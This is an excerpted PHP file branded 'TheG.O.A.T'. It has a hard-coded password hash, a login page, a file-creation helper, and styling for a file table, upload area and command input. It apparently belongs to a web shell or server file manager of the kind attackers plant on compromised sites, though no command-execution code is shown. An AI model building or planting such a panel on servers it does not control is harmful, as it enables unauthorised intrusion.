...
define('AUTH_PASS_HASH', '$2y$10$rp3zyt4oBk5kdm1YpaWvBe3TA4fo9/D8TOv4Ky8cCXYHsCRAXK5am');
...
function create_nonzero_file($path, $userContent = null){
    $default = "Created by TheG.O.A.T @ ".date('c')."\n";
    ...
    $tmp = @tempnam(sys_get_temp_dir(), 'goat_');
    if ($tmp){
...
function render_login($err=''){
    ...
    <!doctype html><html lang="en" class="dark"><head>
      <meta charset="utf-8"><title>TheG.O.A.T</title>
      ...
      <style>
        ...
        .shell{min-height:100vh;background:#000000; display:flex;align-items:center;justify-content:center;}
        .card{background:#0a0a0a;border:1px solid rgba(239,68,68,.3);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.6);backdrop-filter:blur(8px);}
        .btn{background:#b91c1c;color:#fff;border-radius:12px;padding:.7rem 1rem;font-weight:700;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 4px 14px rgba(185,28,28,.4);border:1px solid #ef4444;}
        .btn:hover{filter:brightness(1.15);box-shadow:0 6px 20px rgba(239,68,68,.5)} .btn:active{transform:translateY(.5px)}
        .field{border:1px solid rgba(148,163,184,.25);border-radius:12px;padding:.6rem .8rem;width:100%;background:#000000;color:#e5e7eb;}
        .field:focus{outline:none;box-shadow:0 0 0 3px rgba(239,68,68,.3);border-color:#ef4444}
        .title{color:#ef4444;font-weight:700}
      </style>
    </head><body class="shell text-slate-100">
      <div class="w-full max-w-md card p-6">
        <div class="mb-5">
          <div class="text-xl font-bold tracking-tight title">TheG.O.A.T</div>
        </div>
        ...
        <p class="text-[12px] text-slate-400 mt-4 text-center">TheG.O.A.T</p>
      </div>
    </body></html><?php
}
...
function svgIcon($name,$class='ico'){
    $icons=array(
        ...
        'pwx'=>'<svg viewBox="0 0 24 24" class="'.$class.'" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M12 22L3.9 17.9L15.1 2.5L3.9 6.1L15.1 21.5L12 22Z"/></svg>',
...
<head>
  ...
  <style>
    ...
    body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
    .shell{min-height:100vh;background:#000000; display:grid; grid-template-rows:auto 1fr auto;}
    .card{background:#0a0a0a;border:1px solid rgba(239,68,68,.25);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.5);backdrop-filter:blur(8px);}
    .field{border:1px solid rgba(148,163,184,.25);border-radius:12px;padding:.5rem .75rem;width:100%;background:#000000;color:#e5e7eb;}
    .field:focus{outline:none;box-shadow:0 0 0 3px rgba(239,68,68,.3);border-color:#ef4444}
    .btn{background:#b91c1c;color:#fff;border:1px solid #ef4444;border-radius:10px;padding:.5rem .75rem;font-weight:700;font-size:.875rem;line-height:1.25rem;display:inline-flex;align-items:center;justify-content:center;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 4px 14px rgba(185,28,28,.4);}
    .btn:hover{filter:brightness(1.15);box-shadow:0 6px 20px rgba(239,68,68,.5)} .btn:active{transform:translateY(.5px)}
    ...
    .tbl thead th{position:sticky;top:0;background:#0a0a0ae6;backdrop-filter:blur(6px);z-index:1;color:#cbd5e1}
    .tbl tbody tr:nth-child(even){background:rgba(148,163,184,.06)}
    .tbl tbody tr.hoverable:hover{background:rgba(239,68,68,.15);box-shadow:inset 0 0 0 9999px rgba(239,68,68,.08)}
    ...
    .drop-hint{border:2px dashed rgba(239,68,68,.45); background:rgba(239,68,68,.08)}
    .droptarget{outline:2px dashed rgba(239,68,68,.7); outline-offset:-2px}
    .cm-cmd-input { font-size:13px; line-height:1.45; }
    .cm-cmd-input .CodeMirror { width:100% !important; }
    .cm-cmd-input .CodeMirror-scroll { height:36px !important; }
...
<body class="shell text-slate-100" id="bodyRoot">
  <header class="sticky top-0 z-20 w-full border-b border-slate-800 bg-black/90 backdrop-blur">
    <div class="w-full px-6 py-3 flex items-center justify-between gap-3">
      <div class="flex items-center gap-3 shrink-0">
        ...
        <div>
          <div class="text-lg font-semibold tracking-tight" style="color:#ef4444"><a href="?">TheG.O.A.T</a></div>
